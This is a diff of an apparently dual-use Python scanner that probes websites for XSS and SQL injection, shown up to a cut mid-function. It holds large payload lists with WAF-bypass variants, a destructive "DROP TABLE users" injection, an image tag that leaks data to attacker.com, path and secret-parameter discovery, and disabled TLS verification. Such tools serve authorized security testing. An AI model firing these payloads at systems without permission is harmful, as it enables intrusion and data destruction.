@@ -1,6 +1,6 @@
 #!/usr/bin/env python3
 """
-AutoWeb - Advanced XSS & SQLi Scanner (v2.1 - Bug Fixed)
+AutoWeb - Advanced XSS & SQLi Scanner (v2.2 - Auto-Detection)
 For authorized security testing only.
 """
 
@@ -17,74 +17,66 @@ import argparse
 import sys
 import time
 from requests.exceptions import RequestException, Timeout, ConnectionError
+import logging
+import json
+from collections import defaultdict
+
+# Disable SSL warnings
+import urllib3
+urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
 
 # ────────────────────────────────────────
 # XSS PAYLOADS - Comprehensive Set
 # ────────────────────────────────────────
 
 XSS_PAYLOADS_BASIC = [
-    # ── Most basic / low-hanging fruit ──
     "<script>alert(1)</script>",
     "<script>alert('xss')</script>",
     "<script>confirm(1)</script>",
     "<ScRiPt>alert(1)</ScRiPt>",
-    # ── Simple tag based ──
     "<img src=x onerror=alert(1)>",
     "<img src='x' onerror=alert(1)>",
     "<img src=x onerror=prompt(1)>",
     "<svg onload=alert(1)>",
     "<body onload=alert(1)>",
-    # ── Simple attribute breakouts ──
     "\" onmouseover=alert(1) x=\"",
     "' onmouseover=alert(1) x='",
     "\" autofocus onfocus=alert(1) x=\"",
     "' autofocus onfocus=alert(1) x='",
     "\" onclick=alert(1) x=\"",
     "' onclick=alert(1) x='",
-    # ── URL / protocol handlers ──
     "javascript:alert(1)",
     "\"javascript:alert(1)\"",
     "<a href=javascript:alert(1)>click</a>",
-    # ── Unclosed tags ──
     "<iframe src=javascript:alert(1)>",
     "<embed src=javascript:alert(1)>",
-    # ── Encoded basic ──
     "&lt;script&gt;alert(1)&lt;/script&gt;",
     "%3Cscript%3Ealert(1)%3C/script%3E",
     "%253Cscript%253Ealert(1)%253C/script%253E",
 ]
 
 XSS_PAYLOADS_ADVANCED = [
-    # ── Context-aware / polyglot ──
     "\"';--><img src=x onerror=alert(1)>",
     "\" autofocus onfocus=\"alert(1)",
     "{{constructor.constructor('alert(1)')()}}",
-    # ── WAF bypass: broken tags ──
     "<scr<script>ipt>alert(1)</scr</script>ipt>",
     "<script>eval('al'+'ert(1)')</script>",
-    # ── WAF bypass: encoding ──
     "<script>\\u0061lert(1)</script>",
     "<img src=x onerror=\\u0061lert(1)>",
     "<svg><script>alert&#x28;1&#x29;</script></svg>",
-    # ── WAF bypass: whitespace / comments ──
     "<scr\\tipt>alert(1)</sc\\rippt>",
     "<scr<!-->ipt>alert(1)</scr<!-->ipt>",
     "<script>/**/alert(1)/**/</script>",
-    # ── WAF bypass: eval alternatives ──
     "<script>eval(atob('YWxlcnQoMSk='))</script>",
     "<script>Function('alert(1)')()</script>",
     "<script>setTimeout('alert(1)')</script>",
     "<script>new Function`alert\\1401\\140```</script>",
     "<script>[].constructor.constructor('alert(1)')()</script>",
-    # ── fromCharCode ──
     "<script>eval(String.fromCharCode(97,108,101,114,116,40,49,41))</script>",
-    # ── SVG deeper ──
     "<svg><animatetransform onbegin=alert(1)>",
     "<svg><animate onbegin=alert(1)>",
-    # ── CSS / expression ──
     "<style>body{background-image:url(javascript:alert(1))}</style>",
     "<img src=\"http://attacker.com/leak?data=",
-    # ── Template / Angular ──
     "{{1+1}}",
     "${alert(1)}",
     "<script type=module>alert(1)</script>",
@@ -97,7 +89,6 @@ ALL_XSS_PAYLOADS = XSS_PAYLOADS_BASIC + XSS_PAYLOADS_ADVANCED
 # ────────────────────────────────────────
 
 SQLI_PAYLOADS_BASIC = [
-    # ── Most basic / low-hanging fruit ──
     "'",
     "\"",
     "' --",
@@ -112,16 +103,13 @@ SQLI_PAYLOADS_BASIC = [
     "' OR 1=1 --",
     "1' OR '1'='1",
     "1' OR '1'='1' --",
-    # ── Admin bypass ──
     "admin' --",
     "admin' OR '1'='1",
     "' UNION SELECT * FROM users --",
     "' UNION SELECT 1 --",
-    # ── Numeric ──
     "1 OR 1=1",
     "1 AND 1=1",
     "1 AND 1=2",
-    # ── Comment variations ──
     "'--",
     "'#",
     "')--",
@@ -129,15 +117,11 @@ SQLI_PAYLOADS_BASIC = [
 ]
 
 SQLI_PAYLOADS_ADVANCED = [
-    # ── Error-based (MySQL) ──
     "' AND EXTRACTVALUE(1,CONCAT(0x7e,(SELECT @@version),0x7e))--",
     "' AND EXTRACTVALUE(1,CONCAT(0x7e,(SELECT database()),0x7e))--",
     "' AND UPDATEXML(1,CONCAT(0x7e,(SELECT @@version),0x7e),1)--",
-    # ── Error-based (PostgreSQL) ──
     "' AND CAST((SELECT version()) AS INTEGER)--",
-    # ── Error-based (MSSQL) ──
     "' AND 1=CONVERT(INT, (SELECT @@version))--",
-    # ── UNION-based (column enumeration) ──
     "' UNION SELECT 1--",
     "' UNION SELECT 1,2--",
     "' UNION SELECT 1,2,3--",
@@ -146,50 +130,39 @@ SQLI_PAYLOADS_ADVANCED = [
     "' UNION SELECT NULL--",
     "' UNION SELECT NULL,NULL--",
     "' UNION SELECT NULL,NULL,NULL--",
-    # ── UNION version / db extraction ──
     "' UNION SELECT @@version,2,3--",
     "' UNION SELECT database(),2,3--",
     "' UNION SELECT user(),2,3--",
     "' UNION SELECT table_name,2,3 FROM information_schema.tables--",
-    # ── Boolean-based / blind ──
     "' AND 1=1--",
     "' AND 1=2--",
     "' OR 1=1--",
     "' OR 1=2--",
     "1' AND '1'='1",
     "1' AND '1'='2",
-    # ── Time-based (MySQL) ──
     "' OR SLEEP(3)--",
     "' OR SLEEP(5)--",
     "' AND SLEEP(3)--",
     "' OR BENCHMARK(5000000,MD5('test'))--",
-    # ── Time-based (PostgreSQL) ──
     "' OR (SELECT pg_sleep(3))--",
     "' AND (SELECT pg_sleep(3))--",
-    # ── Time-based (MSSQL) ──
     "' WAITFOR DELAY '0:0:3'--",
     "' WAITFOR DELAY '0:0:5'--",
     "1'; WAITFOR DELAY '0:0:3'--",
-    # ── Time-based (Oracle) ──
     "' OR DBMS_LOCK.SLEEP(3)--",
-    # ── Stacked queries ──
     "'; DROP TABLE users--",
-    # ── WAF bypass: encoding / operators ──
     "%27%20OR%20%271%27%3D%271",
     "'/**/OR/**/'1'='1",
     "'||'1'='1",
     "' OR 1 LIKE 1--",
     "' OR 1 IN (1)--",
     "' OR 1 BETWEEN 0 AND 2--",
-    # ── WAF bypass: hex / char ──
     "' OR 1=0x1--",
     "' OR 1=CHAR(49)--",
     "' OR 1=CHR(49)--",
-    # ── WAF bypass: case variation ──
     "' oR '1'='1",
     "' UNIoN SELECT 1,2,3 --",
     "' sLeEp(3) --",
-    # ── NoSQL injection ──
     "' || '1'=='1",
 ]
 
@@ -262,12 +235,69 @@ WAF_SIGNATURES = {
     'Varnish': ['varnish', 'X-Varnish'],
 }
 
+# ────────────────────────────────────────
+# Auto-Detection: Common paths, parameters, and extensions
+# ────────────────────────────────────────
+
+COMMON_PATHS = [
+    '', 'index.php', 'index.html', 'index.asp', 'index.aspx', 'index.jsp',
+    'home', 'main', 'default', 'portal', 'web', 'app', 'application',
+    'api', 'api/v1', 'api/v2', 'api/v3', 'api/v4',
+    'admin', 'administrator', 'login', 'signin', 'auth', 'authenticate',
+    'register', 'signup', 'account', 'profile', 'user', 'users',
+    'search', 'query', 'results', 'find', 'lookup',
+    'product', 'products', 'item', 'items', 'category', 'categories',
+    'news', 'blog', 'post', 'posts', 'article', 'articles',
+    'about', 'contact', 'support', 'help', 'faq',
+    'download', 'uploads', 'files', 'media', 'images',
+    'test', 'dev', 'staging', 'demo', 'sandbox',
+]
+
+COMMON_PARAMETERS = [
+    'id', 'page', 'cat', 'category', 'product', 'item', 'user', 'userid',
+    'name', 'username', 'email', 'q', 'query', 's', 'search', 'keyword',
+    'action', 'method', 'mode', 'type', 'format', 'view', 'sort', 'order',
+    'lang', 'language', 'locale', 'region', 'country',
+    'debug', 'test', 'dev', 'mode', 'profile',
+    'data', 'input', 'param', 'value', 'redirect', 'return',
+    'file', 'path', 'dir', 'folder', 'filename', 'ext',
+    'start', 'limit', 'offset', 'page_size', 'per_page',
+    'token', 'key', 'api_key', 'apikey', 'secret', 'auth',
+]
+
+COMMON_EXTENSIONS = [
+    '.php', '.asp', '.aspx', '.jsp', '.do', '.action',
+    '.html', '.htm', '.shtml', '.xhtml',
+    '.json', '.xml', '.rss', '.atom',
+    '.js', '.css', '.less', '.scss',
+    '.txt', '.csv', '.tsv', '.log',
+    '.pdf', '.doc', '.docx', '.xls', '.xlsx', '.ppt', '.pptx',
+]
+
+TECHNOLOGY_SIGNATURES = {
+    'PHP': ['php', '.php', 'PHPSESSID'],
+    'ASP.NET': ['asp.net', 'ASP.NET', '__VIEWSTATE', '__EVENTVALIDATION'],
+    'JSP': ['jsp', '.jsp', 'JSESSIONID'],
+    'Ruby on Rails': ['rails', 'ruby', '_session_id'],
+    'Django': ['django', 'csrftoken', 'sessionid'],
+    'Flask': ['flask', 'session', '_flashes'],
+    'Node.js': ['node', 'express', 'connect.sid'],
+    'WordPress': ['wp-content', 'wp-includes', 'wordpress'],
+    'Drupal': ['drupal', 'sites/default'],
+    'Joomla': ['joomla', 'Joomla!'],
+    'Magento': ['magento', 'Mage_Cookies'],
+    'Shopify': ['shopify', 'myshopify.com'],
+    'Wix': ['wix', 'wix.com'],
+    'Angular': ['ng-', '_ng', 'angular'],
+    'React': ['react', '_react', 'data-react'],
+    'Vue.js': ['vue', 'vue.js', 'v-'],
+}
 
 class AutoWebScanner:
     def __init__(self, target_url: str, threads: int = 5, timeout: int = 10,
                  cookies: Optional[Dict] = None, headers: Optional[Dict] = None,
                  crawl_depth: int = 2, delay: float = 0, xss_advanced: bool = True,
-                 sqli_advanced: bool = True):
+                 sqli_advanced: bool = True, auto_detect: bool = True):
         self.target_url = target_url.rstrip('/')
         self.visited: Set[str] = set()
         self.forms: List[Dict] = []
@@ -279,24 +309,192 @@ class AutoWebScanner:
         self.delay = delay
         self.xss_advanced = xss_advanced
         self.sqli_advanced = sqli_advanced
+        self.auto_detect = auto_detect
         self.waf_detected = False
         self.waf_name = "None"
+        self.technologies = set()
+        self.all_parameters = set()
+        self.discovered_urls = set()
+        
         self.session = requests.Session()
         self.session.headers.update(headers or {
             'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 '
                           '(KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
-            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
+            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
             'Accept-Language': 'en-US,en;q=0.5',
+            'Accept-Encoding': 'gzip, deflate',
+            'Connection': 'keep-alive',
+            'Upgrade-Insecure-Requests': '1',
         })
         if cookies:
             self.session.cookies.update(cookies)
         self.domain = urlparse(target_url).netloc
+        self.request_count = 0
+        self.max_requests = 10000
 
     def get_xss_payloads(self) -> List[str]:
         return XSS_PAYLOADS_BASIC + (XSS_PAYLOADS_ADVANCED if self.xss_advanced else [])
 
     def get_sqli_payloads(self) -> List[str]:
         return SQLI_PAYLOADS_BASIC + (SQLI_PAYLOADS_ADVANCED if self.sqli_advanced else [])
+
+    def safe_request(self, method: str, url: str, **kwargs) -> Optional[requests.Response]:
+        """Make a safe request with error handling and rate limiting."""
+        if self.request_count >= self.max_requests:
+            return None
+        
+        try:
+            if self.delay:
+                time.sleep(self.delay)
+            
+            self.request_count += 1
+            kwargs.setdefault('timeout', self.timeout)
+            kwargs.setdefault('verify', False)
+            kwargs.setdefault('allow_redirects', True)
+            
+            if method.lower() == 'get':
+                return self.session.get(url, **kwargs)
+            elif method.lower() == 'post':
+                return self.session.post(url, **kwargs)
+            elif method.lower() == 'head':
+                return self.session.head(url, **kwargs)
+            else:
+                return None
+        except (Timeout, ConnectionError) as e:
+            return None
+        except Exception as e:
+            return None
+
+    # ────────────────────────────────────────
+    # Auto-Detection Methods
+    # ────────────────────────────────────────
+
+    def detect_technologies(self, html: str, headers: Dict) -> None:
+        """Detect technologies used by the target."""
+        content = html.lower() if html else ""
+        header_str = str(headers).lower()
+        
+        for tech, signatures in TECHNOLOGY_SIGNATURES.items():
+            for sig in signatures:
+                if sig.lower() in content or sig.lower() in header_str:
+                    self.technologies.add(tech)
+                    break
+
+    def discover_common_paths(self) -> Set[str]:
+        """Discover common paths on the target."""
+        discovered = set()
+        
+        # Try common paths
+        for path in COMMON_PATHS:
+            test_url = f"{self.target_url}/{path}"
+            r = self.safe_request('head', test_url)
+            if r and r.status_code < 400:
+                discovered.add(test_url)
+                self.discovered_urls.add(test_url)
+                print(f"  [Discovered] {test_url} (status: {r.status_code})")
+        
+        # Try common extensions
+        for ext in COMMON_EXTENSIONS:
+            test_url = f"{self.target_url}{ext}"
+            r = self.safe_request('head', test_url)
+            if r and r.status_code < 400:
+                discovered.add(test_url)
+                self.discovered_urls.add(test_url)
+                print(f"  [Discovered] {test_url} (status: {r.status_code})")
+        
+        return discovered
+
+    def get_common_parameters(self) -> Set[str]:
+        """Get common parameters based on detected technologies."""
+        params = set(COMMON_PARAMETERS)
+        
+        # Add technology-specific parameters
+        for tech in self.technologies:
+            if 'PHP' in tech:
+                params.update(['PHPSESSID', 'lang'])
+            elif 'ASP.NET' in tech:
+                params.update(['__VIEWSTATE', '__EVENTVALIDATION'])
+            elif 'Django' in tech:
+                params.update(['csrftoken', 'sessionid'])
+            elif 'WordPress' in tech:
+                params.update(['wp', 'p', 'page_id', 'cat', 'tag'])
+            elif 'Magento' in tech:
+                params.update(['utm_source', 'utm_medium', 'utm_campaign'])
+        
+        return params
+
+    def test_for_tech_identified_pages(self) -> List[str]:
+        """Test for technology-specific pages and files."""
+        tech_pages = []
+        
+        # WordPress
+        if 'WordPress' in self.technologies:
+            wp_paths = [
+                '/wp-admin', '/wp-login.php', '/wp-content', '/wp-includes',
+                '/xmlrpc.php', '/wp-json', '/wp-json/wp/v2/posts'
+            ]
+            for path in wp_paths:
+                test_url = f"{self.target_url}{path}"
+                r = self.safe_request('head', test_url)
+                if r and r.status_code < 400:
+                    tech_pages.append(test_url)
+                    self.discovered_urls.add(test_url)
+                    print(f"  [Discovered WP] {test_url}")
+        
+        # Django
+        if 'Django' in self.technologies:
+            django_paths = ['/admin', '/static', '/media']
+            for path in django_paths:
+                test_url = f"{self.target_url}{path}"
+                r = self.safe_request('head', test_url)
+                if r and r.status_code < 400:
+                    tech_pages.append(test_url)
+                    self.discovered_urls.add(test_url)
+        
+        # ASP.NET
+        if 'ASP.NET' in self.technologies:
+            asp_paths = ['/login.aspx', '/default.aspx', '/web.config']
+            for path in asp_paths:
+                test_url = f"{self.target_url}{path}"
+                r = self.safe_request('head', test_url)
+                if r and r.status_code < 400:
+                    tech_pages.append(test_url)
+                    self.discovered_urls.add(test_url)
+        
+        return tech_pages
+
+    def discover_dynamic_parameters(self) -> Dict[str, List[str]]:
+        """Discover potential parameters from forms and JavaScript."""
+        print("[*] Discovering dynamic parameters...")
+        
+        discovered_params = {}
+        
+        # Visit discovered pages to extract parameters
+        for url in list(self.discovered_urls)[:20]:  # Limit to avoid too many requests
+            r = self.safe_request('get', url)
+            if r and r.status_code == 200:
+                # Extract from forms
+                forms = self.extract_forms(r.text, url)
+                for form in forms:
+                    for inp in form['inputs']:
+                        if inp['name'] not in discovered_params:
+                            discovered_params[inp['name']] = [url]
+                        elif url not in discovered_params[inp['name']]:
+                            discovered_params[inp['name']].append(url)
+                
+                # Extract from JavaScript (simple regex)
+                js_patterns = re.findall(r'[?&]([a-zA-Z_][a-zA-Z0-9_]*)=', r.text)
+                for param in js_patterns:
+                    if param not in discovered_params:
+                        discovered_params[param] = [url]
+                    elif url not in discovered_params[param]:
+                        discovered_params[param].append(url)
+        
+        # Add to all_parameters
+        for param in discovered_params:
+            self.all_parameters.add(param)
+        
+        return discovered_params
 
     # ────────────────────────────────────────
     # WAF Detection
@@ -307,35 +505,34 @@ class AutoWebScanner:
         for payload in WAF_DETECTION_PAYLOADS:
             try:
                 params = {'test': payload}
-                r = self.session.get(
-                    self.target_url, params=params, timeout=self.timeout
-                )
-                for waf_name, sigs in WAF_SIGNATURES.items():
-                    for sig in sigs:
-                        if sig.lower() in str(r.headers).lower():
-                            self.waf_detected = True
-                            self.waf_name = waf_name
-                            result = f"[!] WAF Detected: {waf_name} (via header signature: {sig})"
-                            print(result)
-                            return result
+                r = self.safe_request('get', self.target_url, params=params)
+                if r:
+                    for waf_name, sigs in WAF_SIGNATURES.items():
+                        for sig in sigs:
+                            if sig.lower() in str(r.headers).lower():
+                                self.waf_detected = True
+                                self.waf_name = waf_name
+                                result = f"[!] WAF Detected: {waf_name} (via header signature: {sig})"
+                                print(result)
+                                return result
             except Exception:
                 continue
 
         # Check status code change
         try:
-            clean_r = self.session.get(self.target_url, timeout=self.timeout)
-            for payload in WAF_DETECTION_PAYLOADS[:3]:
-                dirty_r = self.session.get(
-                    self.target_url,
-                    params={'q': payload},
-                    timeout=self.timeout
-                )
-                if dirty_r.status_code in [403, 406, 429, 503] and clean_r.status_code == 200:
-                    self.waf_detected = True
-                    self.waf_name = f"Status-based"
-                    result = f"[!] WAF/IPS Detected: {self.waf_name}"
-                    print(result)
-                    return result
+            clean_r = self.safe_request('get', self.target_url)
+            if clean_r:
+                for payload in WAF_DETECTION_PAYLOADS[:3]:
+                    dirty_r = self.safe_request(
+                        'get', self.target_url,
+                        params={'q': payload}
+                    )
+                    if dirty_r and dirty_r.status_code in [403, 406, 429, 503] and clean_r.status_code == 200:
+                        self.waf_detected = True
+                        self.waf_name = f"Status-based"
+                        result = f"[!] WAF/IPS Detected: {self.waf_name}"
+                        print(result)
+                        return result
         except Exception:
             pass
 
@@ -349,56 +546,63 @@ class AutoWebScanner:
 
     def extract_links(self, html: str, base_url: str) -> Set[str]:
         links = set()
-        soup = BeautifulSoup(html, 'html.parser')
+        try:
+            soup = BeautifulSoup(html, 'html.parser')
 
-        for tag in soup.find_all(['a', 'link', 'area']):
-            href = tag.get('href')
-            if href:
-                full_url = urljoin(base_url, href)
-                parsed = urlparse(full_url)
-                if parsed.netloc == self.domain and parsed.scheme.startswith('http'):
-                    clean = f"{parsed.scheme}://{parsed.netloc}{parsed.path}"
-                    links.add(clean.rstrip('/'))
+            for tag in soup.find_all(['a', 'link', 'area']):
+                href = tag.get('href')
+                if href:
+                    full_url = urljoin(base_url, href)
+                    parsed = urlparse(full_url)
+                    if parsed.netloc == self.domain and parsed.scheme.startswith('http'):
+                        clean = f"{parsed.scheme}://{parsed.netloc}{parsed.path}"
+                        links.add(clean.rstrip('/'))
 
-        for form in soup.find_all('form'):
-            action = form.get('action')
-            if action:
-                full_url = urljoin(base_url, action)
-                parsed = urlparse(full_url)
-                if parsed.netloc == self.domain:
-                    links.add(f"{parsed.scheme}://{parsed.netloc}{parsed.path}".rstrip('/'))
-
+            for form in soup.find_all('form'):
+                action = form.get('action')
+                if action:
+                    full_url = urljoin(base_url, action)
+                    parsed = urlparse(full_url)
+                    if parsed.netloc == self.domain:
+                        links.add(f"{parsed.scheme}://{parsed.netloc}{parsed.path}".rstrip('/'))
+        except Exception:
+            pass
         return links
 
     def extract_forms(self, html: str, base_url: str) -> List[Dict]:
         forms = []
-        soup = BeautifulSoup(html, 'html.parser')
+        try:
+            soup = BeautifulSoup(html, 'html.parser')
 
-        for form in soup.find_all('form'):
-            action = form.get('action')
-            method = form.get('method', 'get').lower()
-            form_url = urljoin(base_url, action) if action else base_url
+            for form in soup.find_all('form'):
+                action = form.get('action')
+                method = form.get('method', 'get').lower()
+                form_url = urljoin(base_url, action) if action else base_url
 
-            inputs = []
-            for inp in form.find_all(['input', 'textarea', 'select']):
-                input_name = inp.get('name')
-                input_type = inp.get('type', 'text').lower()
-                if input_name:
-                    inputs.append({
-                        'name': input_name,
-                        'type': input_type,
-                        'value': inp.get('value', ''),
-                    })
+                inputs = []
+                for inp in form.find_all(['input', 'textarea', 'select']):
+                    input_name = inp.get('name')
+                    input_type = inp.get('type', 'text').lower()
+                    if input_name:
+                        default_value = inp.get('value', '')
+                        if input_type == 'hidden' and not default_value:
+                            default_value = '1'
+                        inputs.append({
+                            'name': input_name,
+                            'type': input_type,
+                            'value': default_value,
+                        })
 
-            if not inputs:
-                continue
+                if not inputs:
+                    continue
 
-            forms.append({
-                'url': form_url,
-                'method': method,
-                'inputs': inputs,
-            })
-
+                forms.append({
+                    'url': form_url,
+                    'method': method,
+                    'inputs': inputs,
+                })
+        except Exception:
+            pass
         return forms
 
     def extract_url_params(self, url: str) -> List[str]:
@@ -412,28 +616,32 @@ class AutoWebScanner:
         self.visited.add(url)
 
         try:
-            r = self.session.get(url, timeout=self.timeout)
-            if r.status_code != 200 or 'text/html' not in r.headers.get('Content-Type', ''):
+            r = self.safe_request('get', url)
+            if not r or r.status_code != 200:
                 return
 
             html = r.text
+            
+            # Detect technologies
+            self.detect_technologies(html, r.headers)
 
+            # Extract forms
             page_forms = self.extract_forms(html, url)
             if page_forms:
                 print(f"  [Forms] Found {len(page_forms)} form(s) on {url}")
                 self.forms.extend(page_forms)
 
+            # Extract parameters
             params = self.extract_url_params(url)
             if params:
                 print(f"  [Params] Found {len(params)} parameter(s) on {url}: {params}")
+                self.all_parameters.update(params)
 
             if depth < self.crawl_depth:
                 links = self.extract_links(html, url)
                 for link in links:
                     if link not in self.visited:
                         self.crawl(link, depth + 1)
-                        if self.delay:
-                            time.sleep(self.delay)
 
         except Exception as e:
             print(f"  [!] Crawl error on {url}: {str(e)[:80]}")
@@ -443,28 +651,37 @@ class AutoWebScanner:
     # ────────────────────────────────────────
 
     def is_payload_reflected(self, payload: str, response_text: str) -> bool:
+        if not response_text:
+            return False
+        
         if payload in response_text:
             return True
+        
         if urllib.parse.quote(payload, safe='') in response_text:
             return True
         if urllib.parse.quote(payload) in response_text:
             return True
+        
         if payload.replace('<', '&lt;').replace('>', '&gt;') in response_text:
             return True
         if payload.replace('"', '&quot;') in response_text:
             return True
         if payload.replace("'", '&#39;') in response_text:
             return True
+        
         double = urllib.parse.quote(urllib.parse.quote(payload, safe=''), safe='')
         if double in response_text:
             return True
+        
         unique_fragments = [
             'onerror=', 'onload=', 'onfocus=', 'onmouseover=',
             'javascript:', 'src=x', 'svg', 'autofocus',
+            'alert(', 'confirm(', 'prompt('
         ]
         for frag in unique_fragments:
-            if frag in payload and frag in response_text:
+            if frag in payload and frag.lower() in response_text.lower():
                 return True
+        
         return False
 
     def test_xss_reflected(self, url: str, param: str) -> Optional[Dict]:
@@ -477,18 +694,14 @@ class AutoWebScanner:
                 new_query = urllib.parse.urlencode(params, doseq=True)
                 test_url = f"{parsed.scheme}://{parsed.netloc}{parsed.path}?{new_query}"
 
-                r = self.session.get(test_url, timeout=self.timeout)
-
-                if self.is_payload_reflected(payload, r.text):
+                r = self.safe_request('get', test_url)
+                if r and self.is_payload_reflected(payload, r.text):
                     return {
                         'type': 'XSS (Reflected)',
                         'url': test_url,
                         'parameter': param,
                         'payload': payload[:200],
                     }
-
-                if self.delay:
-                    time.sleep(self.delay)
 
             except Exception:
                 continue
@@ -515,11 +728,11 @@ class AutoWebScanner:
                             form_data[other_inp['name']] = other_inp.get('value', 'test')
 
                     if method == 'post':
-                        r = self.session.post(url, data=form_data, timeout=self.timeout)
+                        r = self.safe_request('post', url, data=form_data)
                     else:
-                        r = self.session.get(url, params=form_data, timeout=self.timeout)
+                        r = self.safe_request('get', url, params=form_data)
 
-                    if self.is_payload_reflected(payload, r.text):
+                    if r and self.is_payload_reflected(payload, r.text):
                         findings.append({
                             'type': 'XSS (Form)',
                             'url': url,
@@ -529,57 +742,88 @@ class AutoWebScanner:
                         })
                         break
 
-                    if self.delay:
-                        time.sleep(self.delay)
-
                 except Exception:
                     continue
         return findings
 
+    def test_xss_common_parameters(self) -> List[Dict]:
+        """Test XSS on common parameters discovered during auto-detection."""
+        findings = []
+        print("[*] Testing discovered/common parameters for XSS...")
+        
+        test_urls = list(self.discovered_urls) + [self.target_url]
+        test_urls = test_urls[:10]  # Limit to avoid too many requests
+        
+        common_params = self.get_common_parameters()
+        
+        for url in test_urls:
+            for param in common_params:
+                # Skip if already tested
+                result = self.test_xss_reflected(url, param)
+                if result:
+                    findings.append(result)
+                    print(f"  [XSS FOUND] {param} @ {url[:100]}")
+        
+        return findings
+
     def scan_xss(self):
-        """BUG FIXED - payloads_count defined before conditional blocks"""
         print("\n[===== XSS SCAN =====]")
         all_findings = []
-        payloads_count = len(self.get_xss_payloads())  # ← FIX: moved up here
+        payloads_count = len(self.get_xss_payloads())
 
-        # 1) Test URL parameters
+        # 1) Test URL parameters from crawled pages
         param_tasks = []
         for url in list(self.visited):
             params = self.extract_url_params(url)
             for param in params:
                 param_tasks.append((url, param))
 
-        base_params = self.extract_url_params(self.target_url)
-        for param in base_params:
-            if (self.target_url, param) not in param_tasks:
-                param_tasks.append((self.target_url, param))
+        # 2) Add discovered parameters
+        if self.auto_detect:
+            for param in self.all_parameters:
+                if param not in [p for _, p in param_tasks]:
+                    for url in list(self.discovered_urls)[:5]:
+                        param_tasks.append((url, param))
+
+        # 3) Add common parameters
+        common_params = self.get_common_parameters()
+        for param in common_params:
+            if param not in [p for _, p in param_tasks]:
+                for url in list(self.discovered_urls)[:3] + [self.target_url]:
+                    param_tasks.append((url, param))
 
         if param_tasks:
             total = len(param_tasks)
             print(f"[*] Testing {total} URL parameter(s) with {payloads_count} XSS payloads each...")
-            with ThreadPoolExecutor(max_workers=self.threads) as executor:
+            with ThreadPoolExecutor(max_workers=min(self.threads, len(param_tasks))) as executor:
                 futures = {
                     executor.submit(self.test_xss_reflected, url, param): (url, param)
                     for url, param in param_tasks
                 }
                 for future in as_completed(futures):
-                    result = future.result()
-                    if result:
-                        all_findings.append(result)
-                        print(f"  [XSS FOUND] {result['parameter']} @ {result['url'][:100]}")
-                        print(f"    Payload: {result['payload'][:120]}")
+                    try:
+                        result = future.result(timeout=self.timeout+5)
+                        if result:
+                            all_findings.append(result)
+                            print(f"  [XSS FOUND] {result['parameter']} @ {result['url'][:100]}")
+                            print(f"    Payload: {result['payload'][:120]}")
+                    except Exception as e:
+                        continue
 
-        # 2) Test forms
+        # 4) Test forms
         if self.forms:
             print(f"[*] Testing {len(self.forms)} form(s) with {payloads_count} XSS payloads each...")
-            with ThreadPoolExecutor(max_workers=self.threads) as executor:
+            with ThreadPoolExecutor(max_workers=min(self.threads, len(self.forms))) as executor:
                 futures = {executor.submit(self.test_xss_form, form): form for form in self.forms}
                 for future in as_completed(futures):
-                    results = future.result()
-                    for result in results:
-                        all_findings.append(result)
-                        print(f"  [XSS FOUND] {result['parameter']} ({result['method']}) @ {result['url'][:100]}")
-                        print(f"    Payload: {result['payload'][:120]}")
+                    try:
+                        results = future.result(timeout=self.timeout+5)
+                        for result in results:
+                            all_findings.append(result)
+                            print(f"  [XSS FOUND] {result['parameter']} ({result['method']}) @ {result['url'][:100]}")
+                            print(f"    Payload: {result['payload'][:120]}")
+                    except Exception as e:
+                        continue
 
         self.xss_vulns = all_findings
         if not all_findings:
@@ -591,6 +835,8 @@ class AutoWebScanner:
     # ────────────────────────────────────────
 
     def has_sqli_error(self, response_text: str) -> bool:
+        if not response_text:
+            return False
         for pattern in SQLI_ERROR_INDICATORS:
             if re.search(pattern, response_text, re.IGNORECASE):
                 return True
@@ -600,7 +846,9 @@ class AutoWebScanner:
         try:
             parsed = urlparse(url)
             params = parse_qs(parsed.query, keep_blank_values=True)
-            baseline_r = self.session.get(url, timeout=self.timeout)
+            baseline_r = self.safe_request('get', url)
+            if not baseline_r:
+                return None
             baseline_length = len(baseline_r.text)
             baseline_status = baseline_r.status_code
         except Exception:
@@ -614,10 +862,11 @@ class AutoWebScanner:
                 test_url = f"{parsed.scheme}://{parsed.netloc}{parsed.path}?{new_query}"
 
                 start_time = time.time()
-                r = self.session.get(test_url, timeout=self.timeout + 2)
+                r = self.safe_request('get', test_url)
+                if not r:
+                    continue
                 elapsed = time.time() - start_time
 
-                # Error-based
                 if self.has_sqli_error(r.text):
                     finding = {
                         'type': 'SQLi (Error-based)',
@@ -634,7 +883,6 @@ class AutoWebScanner:
                             break
                     return finding
 
-                # Boolean-based: status change
                 if r.status_code != baseline_status:
                     if any(x in payload.lower() for x in ['or', 'and', 'union', 'sleep', 'waitfor']):
                         return {
@@ -645,7 +893,6 @@ class AutoWebScanner:
                             'detail': f'Status {baseline_status} → {r.status_code}',
                         }
 
-                # Boolean-based: content diff > 30%
                 if baseline_length > 0:
                     content_diff = abs(len(r.text) - baseline_length)
                     if content_diff > baseline_length * 0.3:
@@ -658,7 +905,6 @@ class AutoWebScanner:
                                 'detail': f'Size: {baseline_length} → {len(r.text)} (diff: {content_diff})',
                             }
 
-                # Time-based: slow response
                 if elapsed >= self.timeout * 0.8:
                     if any(x in payload.lower() for x in ['sleep', 'waitfor', 'benchmark', 'pg_sleep', 'dbms_lock']):
                         return {
@@ -668,9 +914,6 @@ class AutoWebScanner:
                             'payload': payload[:200],
                             'detail': f'Response: {elapsed:.2f}s',
                         }
-
-                if self.delay:
-                    time.sleep(self.delay)
 
             except Timeout:
                 if any(x in payload.lower() for x in ['sleep', 'waitfor', 'benchmark', 'pg_sleep', 'dbms_lock']):
@@ -698,11 +941,16 @@ class AutoWebScanner:
                     baseline_data[inp['name']] = inp.get('value', '1')
 
             if method == 'post':
-                baseline_r = self.session.post(url, data=baseline_data, timeout=self.timeout)
+                baseline_r = self.safe_request('post', url, data=baseline_data)
             else:
-                baseline_r = self.session.get(url, params=baseline_data, timeout=self.timeout)
-            baseline_length = len(baseline_r.text)
-            baseline_status = baseline_r.status_code
+                baseline_r = self.safe_request('get', url, params=baseline_data)
+            
+            if baseline_r:
+                baseline_length = len(baseline_r.text)
+                baseline_status = baseline_r.status_code
+            else:
+                baseline_length = 0
